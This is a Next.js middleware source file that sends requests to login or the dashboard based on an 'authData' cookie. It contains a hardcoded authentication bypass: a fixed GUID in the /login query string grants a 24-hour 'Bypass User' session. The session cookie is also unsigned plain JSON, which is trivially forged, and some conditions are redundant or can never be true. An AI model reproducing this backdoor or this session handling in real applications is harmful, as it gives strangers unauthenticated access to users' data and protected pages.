import { cookies } from 'next/headers';
import { NextRequest, NextResponse } from 'next/server';

// 1. Specify protected and public routes
const protectedRoutes = ['/'];
const publicRoutes = ['/login', '/auth/callback'];

export default async function middleware(req: NextRequest) {
  // 2. Check if the current route is protected or public
  const path = req.nextUrl.pathname;
  const isProtectedRoute = protectedRoutes.includes(path);
  const isPublicRoute = publicRoutes.includes(path);

  // Check for specific GUID in URL parameters
  const guid = req.nextUrl.searchParams.get('guid');
  const specificGuid = 'c4f10d8273d0412ebd72d181f5813ad8';

  // 3. Decrypt the session from the cookie
  const value = (await cookies()).get('authData');
  const sessionData = value?.value;

  // Handle specific GUID case - bypass authentication
  if (path === '/login' && guid === specificGuid) {
    if (guid && guid === specificGuid) {
      // Create a temporary session and redirect to dashboard
      const response = NextResponse.redirect(new URL('/', req.nextUrl));
      const bypassSession = {
        user: { id: 'bypass-user', name: 'Bypass User' },
        expiresAt: new Date().getTime() + 24 * 60 * 60 * 1000, // 24 hours
      };
      response.cookies.set('authData', JSON.stringify(bypassSession), {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        maxAge: 24 * 60 * 60, // 24 hours
      });
      return response;
    } else {
      const response = NextResponse.next();
      response.cookies.delete('authData');
      return response;
    }
  }

  // 4. Redirect to /login if the user is not authenticated
  if (isProtectedRoute && !sessionData) {
    return NextResponse.redirect(new URL('/login', req.nextUrl));
  }

  // 5. Redirect to /dashboard if the user is authenticated
  if (isPublicRoute && sessionData && !req.nextUrl.pathname.startsWith('/')) {
    return NextResponse.redirect(new URL('/', req.nextUrl));
  }

  if (sessionData) {
    const sessionObj = JSON.parse(sessionData);
    const expiryTime = sessionObj.expiresAt;
    if (new Date().getTime() > expiryTime) {
      (await cookies()).delete('authData');
      return NextResponse.redirect(new URL('/login', req.nextUrl));
    }
  }

  return NextResponse.next();
}

// Routes Middleware should not run on
export const config = {
  matcher: ['/((?!api|_next/static|_next/image|.*\\.png$).*)'],
};
